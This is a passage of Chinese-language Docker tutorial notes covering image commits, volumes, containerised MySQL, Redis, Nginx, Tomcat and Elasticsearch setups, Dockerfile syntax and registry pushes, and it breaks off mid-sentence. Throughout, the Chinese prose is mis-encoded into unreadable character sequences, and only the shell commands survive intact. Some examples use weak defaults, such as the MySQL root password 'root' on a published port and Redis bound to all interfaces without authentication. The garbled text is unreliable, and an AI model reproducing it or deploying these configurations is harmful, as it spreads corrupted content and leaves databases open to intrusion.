è·¯å¾\n\n\n1\n2\n\n\n# å°å®¹å¨ä¿å­ä¸ºéå\n\ndocker commit -p å®¹å¨åç§° docker.io/zhangsan404/alpine:test_01\n\n\n1\n\n\n\n# éå\n\n\n# unionfs - èåæä»¶ç³»ç»\n\n> unionfsï¼èåæä»¶ç³»ç»ï¼ï¼unionæä»¶ç³»ç»ï¼unionfsï¼æ¯ä¸ç§åå±ãè½»éçº§å¹¶ä¸é«æ§è½çæä»¶ç³»ç»ï¼å®æ¯æå¯¹æä»¶ç³»ç»çä¿®æ¹ä½ä¸ºä¸æ¬¡æäº¤æ¥ä¸å±å±çå å ï¼åæ¶å¯ä»¥å°ä¸åç®å½æè½½å°åä¸ä¸ªèææä»¶ç³»ç»ä¸(unite several directories into a single virtual filesystem)ãunion æä»¶ç³»ç»æ¯ docker éåçåºç¡ãéåå¯ä»¥éè¿åå±æ¥è¿è¡ç»§æ¿ï¼åºäºåºç¡éåï¼æ²¡æç¶éåï¼ï¼å¯ä»¥å¶ä½åç§å·ä½çåºç¨éåã\n\n\n# dockeréåå è½½åç\n\ndockerçéåå®éä¸ç±ä¸å±ä¸å±çæä»¶ç³»ç»ç»æï¼è¿ç§å±çº§çæä»¶ç³»ç»unionfsã\n\nbootfs(boot file system)ä¸»è¦åå«bootloaderåkernel, bootloaderä¸»è¦æ¯å¼å¯¼å è½½kernel, linuxåå¯å¨æ¶ä¼å è½½bootfsæä»¶ç³»ç»ï¼å¨dockeréåçæåºå±æ¯bootfsãè¿ä¸å±ä¸æä»¬å¸åçlinux/unixç³»ç»æ¯ä¸æ ·çï¼åå«bootå è½½å¨ååæ ¸ãå½bootå è½½å®æä¹åæ´ä¸ªåæ ¸å°±é½å¨åå­ä¸­äºï¼æ­¤æ¶åå­çä½¿ç¨æå·²ç±bootfsè½¬äº¤ç»åæ ¸ï¼æ­¤æ¶ç³»ç»ä¹ä¼å¸è½½bootfsã\n\nrootfs (root file system) ï¼å¨bootfsä¹ä¸ãåå«çå°±æ¯å¸å linux ç³»ç»ä¸­ç /dev, /proc, /bin, /etc ç­æ åç®å½åæä»¶ãrootfså°±æ¯åç§ä¸åçæä½ç³»ç»åè¡çï¼æ¯å¦ubuntuï¼centosç­ç­ã\n\n\n\n\n# docker commit\n\n> docker commit å¯ä»¥å°ä¸ä¸ªå®¹å¨æåä¸ºéåã\n\ndocker commit -m="æè¿°ä¿¡æ¯" -a="ä½è" å®¹å¨id éååç§°:tag\n\ne.g.\ndocker commit -m="tomcat with demo/helloworld" -a="jm" 0179893d97e7 jm/tomcat:1.2\n\n\n1\n2\n3\n4\n\n\n\n\n\n# å®¹å¨æ°æ®å·\n\n> dockerå®¹å¨äº§ççæ°æ®ï¼å¦æä¸éè¿docker commitçææ°çéåï¼ä½¿å¾æ°æ®åä¸ºéåçä¸é¨åä¿å­ä¸æ¥ï¼é£ä¹å½å®¹å¨å é¤åï¼æ°æ®èªç¶ä¹å°±æ²¡æäºã ä¸ºäºè½ä¿å­æ°æ®å¨dockerä¸­æä»¬ä½¿ç¨å®¹å¨æ°æ®å·ã\n\nå·å°±æ¯ç®å½ææä»¶ï¼å­å¨äºä¸ä¸ªæå¤ä¸ªå®¹å¨ä¸­ï¼ç±dockeræè½½å°å®¹å¨ï¼ä½ä¸å±äºèåæä»¶ç³»ç»ï¼å æ­¤è½å¤ç»è¿union file systemæä¾ä¸äºç¨äºæç»­å­å¨æå±äº«æ°æ®çç¹æ§ã\n\nå·çè®¾è®¡ç®çå°±æ¯æ°æ®çæä¹åï¼å®å¨ç¬ç«äºå®¹å¨ççå­å¨æï¼å æ­¤dockerä¸ä¼å¨å®¹å¨å é¤æ¶å é¤å¶æè½½çæ°æ®å·\n\nç¹ç¹ï¼\n\n1ï¼æ°æ®å·å¯å¨å®¹å¨ä¹é´å±äº«æéç¨æ°æ® 2ï¼å·ä¸­çæ´æ¹å¯ä»¥ç´æ¥çæ 3ï¼æ°æ®å·ä¸­çæ´æ¹ä¸ä¼åå«å¨éåçæ´æ°ä¸­ 4ï¼æ°æ®å·ççå½å¨æä¸ç´æç»­å°æ²¡æå®¹å¨ä½¿ç¨å®ä¸ºæ­¢\n\n\n# å½ä»¤è¡åå»ºå®¹å¨æ°æ®å·\n\n# åå»ºå®¹å¨å·\n\n\tdocker run -ti --name demo01 -v ~/myfile:/opt:ro centos:latest # å¸¦æé\n\n\n1\n\n\n# æ¥çå®¹å¨å·æè½½æåµ\n\ndocker inspect demo01  # æ¥çå®¹å¨è¯¦ç»ä¿¡æ¯\n\n\n1\n\n\n\n\n\n# dockerfileåå»ºå®¹å¨æ°æ®å·\n\n 1. åå»ºä¸ä¸ªæä»¶å¤¹\n\nmkdir mydockerfile\n\n\n1\n\n 2. åå»ºdockerfileæä»¶\n\nvim dockerfile\n\nfrom centos   # å¯¼å¥centoséå\nvolume ["/datavolumecontainer1","/datavolumecontainer2"]  # åå»ºä¸¤ä¸ªå®¹å¨æ°æ®å·ï¼ç±äºä¸»æºçæä»¶å¤¹æ æ³æå®ï¼è¿éçå®¹å¨æ°æ®å·åªædockeræ¹åç\ncmd echo "finished,--------success1"\ncmd /bin/bash  # æ§è¡bash\n\n\n1\n2\n3\n4\n5\n6\n\n 3. æå»ºå®¹å¨\n\ndocker build -f dockerfileä½ç½® -t è¾åºçéååç§° . # å½åç®å½\n\ne.g.\ndocker build -f ~/mydockerfile/dockerfile -t jm/centos_jm:1.1 .\n\n\n1\n2\n3\n4\n\n\n\n\né»è®¤ä¸»æºç«¯æ°æ®å·å¯¹æ¥ä½ç½®ï¼\n\n\n\n\n# æ°æ®å·å®¹å¨\n\n> å½åçå®¹å¨æè½½æ°æ®å·ï¼å¶å®å®¹å¨éè¿æè½½è¿ä¸ª(ç¶å®¹å¨)å®ç°æ°æ®å±äº«ï¼æè½½æ°æ®å·çå®¹å¨ï¼ç§°ä¹ä¸ºæ°æ®å·å®¹å¨\n\nåå»ºç¶å®¹å¨\n\ndocker run -ti --name dc01 jm/jm_centos:1.0\n\n\n1\n\n\nåå»ºå­å®¹å¨\n\ndocker run -ti --name dc02 --volumes-from dc01 jm/jm_centos:1.0\n\n\n1\n\n\nå­å®¹å¨åç¶å®¹å¨å±äº«æ°æ®å·ï¼å½ç¶å®¹å¨å é¤æ¶ï¼å­å®¹å¨åå®¹ä¸ä¼å é¤ãå¯ä»¥çè§£ä¸ºå®¹å¨åæ°æ®å·åç¦»ï¼å®¹å¨æ²¡äºï¼æ°æ®å·è¿å¨ã\n\n\n# dockerå®è£å¸¸è§çæå¡\n\n\n# docker å®è£ mysql\n\n# 1.æåmysqléåå°æ¬å°\ndocker pull mysql:tag (tagä¸å é»è®¤ææ°çæ¬)\n\n# 2.è¿è¡mysqlæå¡\ndocker run --name mysql -e mysql_root_password=root -d mysql:tag  \t\t\t\t\t\t  --æ²¡ææ´é²å¤é¨ç«¯å£å¤é¨ä¸è½è¿æ¥\ndocker run --name mysql -e mysql_root_password=root -p 3306:3306 -d  mysql:tag  --æ²¡ææ´é²å¤é¨ç«¯å£\n\n# 3.è¿å¥mysqlå®¹å¨\ndocker exec -it å®¹å¨åç§°|å®¹å¨id bash\n\n# 4.å¤é¨æ¥çmysqlæ¥å¿\ndocker logs å®¹å¨åç§°|å®¹å¨id\n\n# 5.ä½¿ç¨èªå®ä¹éç½®åæ°\ndocker run --name mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e mysql_root_password=root -d mysql:tag\n\n# 6.å°å®¹å¨æ°æ®ä½ç½®ä¸å®¿ä¸»æºä½ç½®æè½½ä¿è¯æ°æ®å®å¨\ndocker run --name mysql -v /root/mysql/data:/var/lib/mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e mysql_root_password=root -p 3306:3306 -d mysql:tag\n\n# 7.éè¿å¶ä»å®¢æ·ç«¯è®¿é® å¦å¨windowç³»ç»|macosç³»ç»ä½¿ç¨å®¢æ·ç«¯å·¥å·è®¿é®\n\n# 8.å°mysqlæ°æ®åºå¤ä»½ä¸ºsqlæä»¶\ndocker exec mysql|å®¹å¨id sh -c \'exec mysqldump --all-databases -uroot -p"$mysql_root_password"\' > /root/all-databases.sql  --å¯¼åºå¨é¨æ°æ®\ndocker exec mysql sh -c \'exec mysqldump --databases åºè¡¨ -uroot -p"$mysql_root_password"\' > /root/all-databases.sql  --å¯¼åºæå®åºæ°æ®\ndocker exec mysql sh -c \'exec mysqldump --no-data --databases åºè¡¨ -uroot -p"$mysql_root_password"\' > /root/all-databases.sql  --å¯¼åºæå®åºæ°æ®ä¸è¦æ°æ®\n\n# 9.æ§è¡sqlæä»¶å°mysqlä¸­\ndocker exec -i mysql sh -c \'exec mysql -uroot -p"$mysql_root_password"\' < /root/xxx.sql\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# dockerå®è£redis\n\n# 1.å¨docker hubæç´¢rediséå\ndocker search redis\n\n# 2.æårediséåå°æ¬å°\ndocker pull redis\n\n# 3.å¯å¨redisæå¡è¿è¡å®¹å¨\ndocker run --name redis -d redis:tag (æ²¡ææ´é²å¤é¨ç«¯å£)\ndocker run --name redis -p 6379:6379 -d redis:tag (æ´é²å¤é¨å®¿ä¸»æºç«¯å£ä¸º6379è¿è¡è¿æ¥) \n\n# 4.æ¥çå¯å¨æ¥å¿\ndocker logs -t -f å®¹å¨id|å®¹å¨åç§°\n\n# 5.è¿å¥å®¹å¨åé¨æ¥ç\ndocker exec -it å®¹å¨id|åç§° bash  \n\n# 6.å è½½å¤é¨èªå®ä¹éç½®å¯å¨rediså®¹å¨\né»è®¤æåµä¸rediså®æ¹éåä¸­æ²¡æredis.conféç½®æä»¶ éè¦å»å®ç½ä¸è½½æå®çæ¬çéç½®æä»¶\n1. wget http://download.redis.io/releases/redis-5.0.8.tar.gz  ä¸è½½å®æ¹å®è£å\n2. å°å®æ¹å®è£åä¸­éç½®æä»¶è¿è¡å¤å¶å°å®¿ä¸»æºæå®ç®å½ä¸­å¦ /root/redis/redis.confæä»¶\n3. ä¿®æ¹éè¦èªå®ä¹çéç½®\nbind 0.0.0.0 å¼å¯è¿ç¨æé\nappenonly yes å¼å¯aofæä¹å\n4. å è½½éç½®å¯å¨\ndocker run --name redis -v /root/redis:/usr/local/etc/redis -p 6379:6379 -d redis redis-server /usr/local/etc/redis/redis.conf  \n\n# 7.å°æ°æ®ç®å½æå¨å°æ¬å°ä¿è¯æ°æ®å®å¨\ndocker run --name redis -v /root/redis/data:/data -v /root/redis/redis.conf:/usr/local/etc/redis/redis.conf -p 6379:6379 -d redis redis-server \t\t\t\t\t/usr/local/etc/redis/redis.conf  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# docker å®è£ nginx\n\n# 1.å¨docker hubæç´¢nginx\ndocker search nginx\n\n# 2.æånginxéåå°æ¬å°\n[root@localhost ~]# docker pull nginx\nusing default tag: latest\nlatest: pulling from library/nginx\nafb6ec6fdc1c: pull complete \nb90c53a0b692: pull complete \n11fa52a0fdc0: pull complete \ndigest: sha256:30dfa439718a17baafefadf16c5e7c9d0a1cde97b4fd84f63b69e13513be7097\nstatus: downloaded newer image for nginx:latest\ndocker.io/library/nginx:latest\n\n# 3.å¯å¨nginxå®¹å¨\ndocker run -p 80:80 --name nginx01 -d nginx\n\n# 4.è¿å¥å®¹å¨\ndocker exec -it nginx01 /bin/bash\næ¥æ¾ç®å½:  whereis nginx\néç½®æä»¶:  /etc/nginx/nginx.conf\n\n# 5.å¤å¶éç½®æä»¶å°å®¿ä¸»æº\ndocker cp nginx01(å®¹å¨id|å®¹å¨åç§°):/etc/nginx/nginx.conf å®¿ä¸»æºåå½\n\n# 6.æå¨nginxéç½®ä»¥åhtmlå°å®¿ä¸»æºå¤é¨\ndocker run --name nginx02 -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf -v /root/nginx/html:/usr/share/nginx/html -p 80:80 -d nginx\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# docker å®è£ tomcat\n\n# 1.å¨docker hubæç´¢tomcat\ndocker search tomcat\n\n# 2.ä¸è½½tomcatéå\ndocker pull tomcat\n\n# 3.è¿è¡tomcatéå\ndocker run -p 8080:8080 -d --name mytomcat tomcat\n\n# 4.è¿å¥tomcatå®¹å¨\ndocker exec -it mytomcat /bin/bash\n\n# 5.å°webappsç®å½æè½½å¨å¤é¨\ndocker run -p 8080:8080 -v /root/webapps:/usr/local/tomcat/webapps -d --name mytomcat tomcat\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# docker å®è£ es\n\n# 0. æåéå å¯å¨å®¹å¨\n\n# 1.dockerhub æåéå\n\tdocker pull elasticsearch:6.4.2\n# 2.æ¥çdockeréå\n\tdocker images\n# 3.è¿è¡dockeréå\n\tdocker run -p 9200:9200 -p 9300:9300 elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n\n# 1. è¿è¡ç¸å³çéç½®\n\n# 1.å¨centosèææºä¸­ï¼ä¿®æ¹éç½®sysctl.conf\n\tvim /etc/sysctl.conf\n# 2.å å¥å¦ä¸éç½®\n\tvm.max_map_count=262144 \n# 3.å¯ç¨éç½®\n\tsysctl -p\n\tæ³¨ï¼è¿ä¸æ­¥æ¯ä¸ºäºé²æ­¢å¯å¨å®¹å¨æ¶ï¼æ¥åºå¦ä¸éè¯¯ï¼\n\tbootstrap checks failed max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 2. å¯å¨å®¹å¨\n\n# 0.å¤å¶å®¹å¨ä¸­dataç®å½å°å®¿ä¸»æºä¸­\ndocker cp å®¹å¨id:/usr/share/share/elasticsearch/data /root/es\n# 1.è¿è¡eså®¹å¨ æå®jvmåå­å¤§å°å¹¶æå®ikåè¯å¨ä½ç½®\ndocker run -d --name es -p 9200:9200 -p 9300:9300 -e es_java_opts="-xms128m -xmx128m" -v /root/es/plugins:/usr/share/elasticsearch/plugins -v /root/es/data:/usr/share/elasticsearch/data elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n\n\n# 3.å®è£ikåè¯å¨\n\n# 1.ä¸è½½å¯¹åºçæ¬çikåè¯å¨\nwget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.4.2/elasticsearch-analysis-ik-6.4.2.zip\n\n# 2.è§£åå°pluginsæä»¶å¤¹ä¸­\nyum install -y unzip\nunzip -d ik elasticsearch-analysis-ik-6.4.2.zip\n\n# 3.æ·»å èªå®ä¹æ©å±è¯ååç¨è¯\ncd plugins/elasticsearch/config\nvim ikanalyzer.cfg.xml\n<properties>\n<comment>ik analyzer æ©å±éç½®</comment>\n\x3c!--ç¨æ·å¯ä»¥å¨è¿ééç½®èªå·±çæ©å±å­å¸ --\x3e\n<entry key="ext_dict">ext_dict.dic</entry>\n\x3c!--ç¨æ·å¯ä»¥å¨è¿ééç½®èªå·±çæ©å±åæ­¢è¯å­å¸--\x3e\n<entry key="ext_stopwords">ext_stopwords.dic</entry>\n</properties>\n\n# 4.å¨ikåè¯å¨ç®å½ä¸configç®å½ä¸­åå»ºext_dict.dicæä»¶   ç¼ç ä¸å®è¦ä¸ºutf-8æè½çæ\nvim ext_dict.dic å å¥æ©å±è¯å³å¯\n# 5. å¨ikåè¯å¨ç®å½ä¸configç®å½ä¸­åå»ºext_stopword.dicæä»¶ \nvim ext_stopwords.dic å å¥åç¨è¯å³å¯\n\n# 6.éå¯å®¹å¨çæ\ndocker restart å®¹å¨id\n# 7.å°æ­¤å®¹å¨æäº¤æä¸ºä¸ä¸ªæ°çéå\ndocker commit -a="xiaochen" -m="es with ikanalyzer" å®¹å¨id xiaochen/elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n# 4. å®è£kibana\n\n# 1.ä¸è½½kibanaéåå°æ¬å°\ndocker pull kibana:6.4.2\n\n# 2.å¯å¨kibanaå®¹å¨\ndocker run -d --name kibana -e elasticsearch_url=http://10.15.0.3:9200 -p 5601:5601 kibana:6.4.2\n\n\n1\n2\n3\n4\n5\n\n\n\n# docker å¸¸è§é®é¢å¤ç½®\n\n[root@localhost ~]# docker search mysql æè docker pull è¿äºå½ä»¤æ æ³ä½¿ç¨\nerror response from daemon: get https://index.docker.io/v1/search?q=mysql&n=25: x509: certificate has expired or is not yet valid\n\n\n1\n2\n\n\n\n\næ³¨æ:è¿ä¸ªéè¯¯çåå å¨äºæ¯ç³»ç»çæ¶é´ådocker hubæ¶é´ä¸ä¸è´,éè¦åç³»ç»æ¶é´ä¸ç½ç»æ¶é´åæ­¥\n\n# 1.å®è£æ¶é´åæ­¥\n\tsudo yum -y install ntp ntpdate\n# 2.åæ­¥æ¶é´\n\tsudo ntpdate cn.pool.ntp.org\n# 3.æ¥çæ¬æºæ¶é´\n\tdate\n# 4.ä»æ°æµè¯\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# dockerfile\n\n> dockerfileæ¯ç¨æ¥æå»ºdockeréåçæå»ºæä»¶ï¼æ¯ç±ä¸ç³»åå½ä»¤ååæ°ææçèæ¬ã\n\n\n# ä»ä¹æ¯dockerfile\n\ndockerfileå¯ä»¥è®¤ä¸ºæ¯dockeréåçæè¿°æä»¶ï¼æ¯ç±ä¸ç³»åå½ä»¤ååæ°ææçèæ¬ãä¸»è¦ä½ç¨æ¯ç¨æ¥æå»ºdockeréåçæå»ºæä»¶ã\n\n\n\n * éè¿æ¶æå¾å¯ä»¥çåºéè¿dockerfileå¯ä»¥ç´æ¥æå»ºéå\n\n\n# dockerfileè§£æè¿ç¨\n\n\n\n\n# dockerfileçä¿çå½ä»¤\n\nå®æ¹è¯´æ:https://docs.docker.com/engine/reference/builder/\n\nä¿çå­          ä½ç¨\nfrom         å½åéåæ¯åºäºåªä¸ªéåç ç¬¬ä¸ä¸ªæä»¤å¿é¡»æ¯from\nmaintainer   éåç»´æ¤èçå§ååé®ç®±å°å\nrun          æå»ºéåæ¶éè¦è¿è¡çæä»¤\nexpose       å½åå®¹å¨å¯¹å¤æ´é²åºçç«¯å£å·\nworkdir      æå®å¨åå»ºå®¹å¨åï¼ç»ç«¯é»è®¤ç»å½è¿æ¥çå·¥ä½ç®å½ï¼ä¸ä¸ªè½èç¹\nenv          ç¨æ¥å¨æå»ºéåè¿ç¨ä¸­è®¾ç½®ç¯å¢åé\nadd          å°å®¿ä¸»æºç®å½ä¸çæä»¶æ·è´è¿éåä¸addå½ä»¤ä¼èªå¨å¤çurlåè§£åtarå\ncopy         ç±»ä¼¼äºaddï¼æ·è´æä»¶åç®å½å°éåä¸­\n             å°ä»æå»ºä¸ä¸æç®å½ä¸­<åè·¯å¾>çæä»¶/ç®å½å¤å¶å°æ°çä¸å±çéååç<ç®æ è·¯å¾>ä½ç½®\nvolume       å®¹å¨æ°æ®å·ï¼ç¨äºæ°æ®ä¿å­åæä¹åå·¥ä½\ncmd          æå®ä¸ä¸ªå®¹å¨å¯å¨æ¶è¦è¿è¡çå½ä»¤\n             dockerfileä¸­å¯ä»¥æå¤ä¸ªcmdæä»¤ï¼ä½åªææåä¸ä¸ªçæï¼cmdä¼è¢«docker runä¹åçåæ°æ¿æ¢\nentrypoint   æå®ä¸ä¸ªå®¹å¨å¯å¨æ¶è¦è¿è¡çå½ä»¤\n             entrypointçç®çåcmdä¸æ ·ï¼é½æ¯å¨æå®å®¹å¨å¯å¨ç¨åºåå¶åæ°\n\n# from\n\n * åºäºé£ä¸ªéåè¿è¡æå»ºæ°çéå,å¨æå»ºæ¶ä¼èªå¨ä»docker hubæåbaseéå å¿é¡»ä½ä¸ºdockerfileçç¬¬ä¸ä¸ªæä»¤åºç°\n\n * è¯­æ³:\n   \n   from  <image>\n   from  <image>[:<tag>]     ä½¿ç¨çæ¬ä¸åä¸ºlatest\n   from  <image>[@<digest>]  ä½¿ç¨æè¦\n   \n   \n   1\n   2\n   3\n   \n\n# maintainer\n\n * éåç»´æ¤èçå§ååé®ç®±å°å[åºå¼]\n\n * è¯­æ³:\n   \n   maintainer <name>\n   \n   \n   1\n   \n\n# run\n\n * runæä»¤å°å¨å½åæ åä¹ä¸çæ°å±ä¸­æ§è¡ä»»ä½å½ä»¤å¹¶æäº¤ç»æãçæçæäº¤æ åå°ç¨äºdockerfileä¸­çä¸ä¸æ­¥\n\n * è¯­æ³:\n   \n   run <command> (shell form, the command is run in a shell, which by default is /bin/sh -c on linux or cmd /s /c on windows)\n   run echo hello\n   \n   run ["executable", "param1", "param2"] (exec form)\n   run ["/bin/bash", "-c", "echo hello"]\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# expose\n\n * ç¨æ¥æå®æå»ºçéåå¨è¿è¡ä¸ºå®¹å¨æ¶å¯¹å¤æ´é²çç«¯å£\n\n * è¯­æ³:\n   \n   expose 80/tcp  å¦ææ²¡ææ¾ç¤ºæå®åé»è®¤æ´é²é½æ¯tcp\n   expose 80/udp\n   \n   \n   1\n   2\n   \n\n# cmd\n\n * ç¨æ¥ä¸ºå¯å¨çå®¹å¨æå®æ§è¡çå½ä»¤,å¨dockerfileä¸­åªè½æä¸æ¡cmdæä»¤ãå¦æååºå¤ä¸ªå½ä»¤ï¼ååªææåä¸ä¸ªå½ä»¤æä¼çæã\n\n * æ³¨æ: dockerfileä¸­åªè½æä¸æ¡cmdæä»¤ãå¦æååºå¤ä¸ªå½ä»¤ï¼ååªææåä¸ä¸ªå½ä»¤æä¼çæã\n\n * è¯­æ³:\n   \n   cmd ["executable","param1","param2"] (exec form, this is the preferred form)\n   cmd ["param1","param2"] (as default parameters to entrypoint)\n   cmd command param1 param2 (shell form)\n   \n   \n   1\n   2\n   3\n   \n\n# workdir\n\n * ç¨æ¥ä¸ºdockerfileä¸­çä»»ä½runãcmdãentrypointãcopyåaddæä»¤è®¾ç½®å·¥ä½ç®å½ãå¦æworkdirä¸å­å¨ï¼å³ä½¿å®æ²¡æå¨ä»»ä½åç»­dockerfileæä»¤ä¸­ä½¿ç¨ï¼å®ä¹å°è¢«åå»ºã\n\n * è¯­æ³:\n   \n   workdir /path/to/workdir\n   \n   workdir /a\n   workdir b\n   workdir c\n   `æ³¨æ:workdiræä»¤å¯ä»¥å¨dockerfileä¸­å¤æ¬¡ä½¿ç¨ãå¦ææä¾äºç¸å¯¹è·¯å¾ï¼åè¯¥è·¯å¾å°ä¸ååworkdiræä»¤çè·¯å¾ç¸å¯¹`\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n# env\n\n * ç¨æ¥ä¸ºæå»ºéåè®¾ç½®ç¯å¢åéãè¿ä¸ªå¼å°åºç°å¨æå»ºé¶æ®µä¸­ææåç»­æä»¤çç¯å¢ä¸­ã\n\n * è¯­æ³ï¼\n   \n   env <key> <value>\n   env <key>=<value> ...\n   \n   \n   1\n   2\n   \n\n# add\n\n * ç¨æ¥ä»contextä¸ä¸æå¤å¶æ°æä»¶ãç®å½æè¿ç¨æä»¶urlï¼å¹¶å°å®ä»¬æ·»å å°ä½äºæå®è·¯å¾çæ åæä»¶ç³»ç»ä¸­ã\n\n * è¯­æ³:\n   \n   add hom* /mydir/       ééç¬¦æ·»å å¤ä¸ªæä»¶\n   add hom?.txt /mydir/   ééç¬¦æ·»å \n   add test.txt relativedir/  å¯ä»¥æå®ç¸å¯¹è·¯å¾\n   add test.txt /absolutedir/ ä¹å¯ä»¥æå®ç»å¯¹è·¯å¾\n   add url \n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# copy\n\n * ç¨æ¥å°contextç®å½ä¸­æå®æä»¶å¤å¶å°éåçæå®ç®å½ä¸­\n\n * è¯­æ³:\n   \n   copy src dest\n   copy ["<src>",... "<dest>"]\n   \n   \n   1\n   2\n   \n\n# volume\n\n * ç¨æ¥å®ä¹å®¹å¨è¿è¡æ¶å¯ä»¥æå¨å°å®¿ä¸»æºçç®å½\n\n * è¯­æ³:\n   \n   volume ["/data"]\n   \n   \n   1\n   \n\n# entrypoint\n\n * ç¨æ¥æå®å®¹å¨å¯å¨æ¶æ§è¡å½ä»¤åcmdç±»ä¼¼\n\n * è¯­æ³:\n   \n     ["executable", "param1", "param2"]\n   entrypoint command param1 param2\n   \n   \n   1\n   2\n   \n   \n   entrypointæä»¤ï¼å¾å¾ç¨äºè®¾ç½®å®¹å¨å¯å¨åçç¬¬ä¸ä¸ªå½ä»¤ï¼è¿å¯¹ä¸ä¸ªå®¹å¨æ¥è¯´å¾å¾æ¯åºå®çã cmdæä»¤ï¼å¾å¾ç¨äºè®¾ç½®å®¹å¨å¯å¨çç¬¬ä¸ä¸ªå½ä»¤çé»è®¤åæ°ï¼è¿å¯¹ä¸ä¸ªå®¹å¨æ¥è¯´å¯ä»¥æ¯ååçã\n\n# onbuild\n\nè§¦åå¨ï¼å½æå»ºä¸ä¸ªè¢«ç»§æ¿çdockerfileæ¶è¿è¡çå½ä»¤ï¼ç¶éåå¨è¢«å­éåéæä¹åï¼onbuildè¢«è§¦å\n\n\n\n\n# dockerfile æå springbooté¡¹ç®\n\n# 0. æåæ¬å°é¡¹ç®\n\n\n\n# 1. å°å¯è¿è¡é¡¹ç®æ¾å¥linuxèææºä¸­\n\n\n\n# 3. ç¼ådockerfile\n\nfrom openjdk:8\nworkdir /ems\nadd ems.jar /ems\nexpose 8989\nentrypoint ["java","-jar"]\ncmd ["ems.jar"]\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 4. æå»ºè¿è¡\n\n[root@localhost ems]# docker build -t ems .\n[root@localhost ems]# docker run -p 8989:8989 ems\n\n\n1\n2\n\n\n\n# æ¬å°éååå¸\n\n<https://cr.console.aliyun.com/cn-beijing/instance/repositories>\n\n\n1\n\n\n\n\n1. ç»å½é¿éäºdocker registry $ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n\nç¨äºç»å½çç¨æ·åä¸ºé¿éäºè´¦å·å¨åï¼å¯ç ä¸ºå¼éæå¡æ¶è®¾ç½®çå¯ç ã æ¨å¯ä»¥å¨è®¿é®å­è¯é¡µé¢ä¿®æ¹å­è¯å¯ç ã\n\n\n# 2. ä»registryä¸­æåéå\n\n$ sudo docker pull registry.cn-beijing.aliyuncs.com/csbugless/test:[éåçæ¬å·]\n\n\n1\n\n\n\n# 3. å°éåæ¨éå°registry\n\n$ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n$ sudo docker tag [imageid] registry.cn-beijing.aliyuncs.com/csbugless/test:[éåçæ¬å·]\n$ sudo docker push registry.cn-beijing.aliyuncs.com/csbugless/test:[éåçæ¬å·]\n\n\n1\n2\n3\n\n\nè¯·æ ¹æ®å®ééåä¿¡æ¯æ¿æ¢ç¤ºä¾ä¸­ç[imageid]å[éåçæ¬å·]åæ°ã\n\n\n# 4. éæ©åéçéåä»åºå°å\n\nä»ecsæ¨ééåæ¶ï¼å¯ä»¥éæ©ä½¿ç¨éåä»åºåç½å°åãæ¨ééåº¦å°å¾å°æåå¹¶ä¸å°ä¸ä¼æèæ¨çå¬ç½æµéã\n\nå¦ææ¨ä½¿ç¨çæºå¨ä½äºvpcç½ç»ï¼è¯·ä½¿ç¨ registry-vpc.cn-beijing.aliyuncs.com ä½ä¸ºregistryçååç»å½ã\n\n\n# 5. ç¤ºä¾\n\nä½¿ç¨"docker tag"å½ä»¤éå½åéåï¼å¹¶å°å®éè¿ä¸æç½ç»å°åæ¨éè³registryã\n\n$ sudo docker imagesrepository                                                         tag                 image id            created             virtual sizeregistry.aliyuncs.com/acs/agent                                    0.7-dfb6816         37bb9c63c8b2        7 days ago          37.89 mb$ sudo docker tag 37bb9c63c8b2 registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\nä½¿ç¨ "docker push" å½ä»¤å°è¯¥éåæ¨éè³è¿ç¨ã\n\n$ sudo docker push registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\n\n# é«çº§ç½ç»åå®¹å¨å·\n\n\n# é«çº§ç½ç»éç½®\n\n# è¯´æ\n\nå½ docker å¯å¨æ¶ï¼ä¼èªå¨å¨ä¸»æºä¸åå»ºä¸ä¸ª docker0 èæç½æ¡¥ï¼å®éä¸æ¯ linux çä¸ä¸ª bridgeï¼å¯ä»¥çè§£ä¸ºä¸ä¸ªè½¯ä»¶äº¤æ¢æºãå®ä¼å¨æè½½å°å®çç½å£ä¹é´è¿è¡è½¬åã\n\nåæ¶ï¼docker éæºåéä¸ä¸ªæ¬å°æªå ç¨çç§æç½æ®µï¼å¨ rfc1918 ä¸­å®ä¹ï¼ä¸­çä¸ä¸ªå°åç» docker0 æ¥å£ãæ¯å¦å¸åç 172.17.42.1ï¼æ©ç ä¸º 255.255.0.0ãæ­¤åå¯å¨çå®¹å¨åçç½å£ä¹ä¼èªå¨åéä¸ä¸ªåä¸ç½æ®µï¼172.17.0.0/16ï¼çå°åã\n\nå½åå»ºä¸ä¸ª docker å®¹å¨çæ¶åï¼åæ¶ä¼åå»ºäºä¸å¯¹ veth pair æ¥å£ï¼å½æ°æ®å